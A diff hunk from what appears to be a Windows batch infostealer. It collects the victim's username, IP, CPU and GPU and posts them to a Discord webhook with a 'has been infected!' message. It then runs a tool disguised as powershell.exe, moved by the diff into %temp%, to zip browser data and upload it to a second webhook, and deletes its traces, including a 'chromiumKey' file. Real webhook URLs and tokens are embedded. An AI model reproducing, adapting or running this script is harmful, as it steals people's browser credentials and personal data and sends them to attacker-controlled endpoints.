@@ -6,7 +6,7 @@ for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get n
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been infected!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ
 endlocal
 
-powershell.exe --zip --dir dump
+%temp%\powershell.exe --zip --dir dump
 curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" https://discord.com/api/webhooks/1007412375793709080/BZDz7xnEo4Aqs2-JTp6fwNgonAfSNopbaeXJ2vbUcbfXkiG52jITU3KV8F-vUWDkD97g
 rd /s /q dump&del chromiumKey /f
 
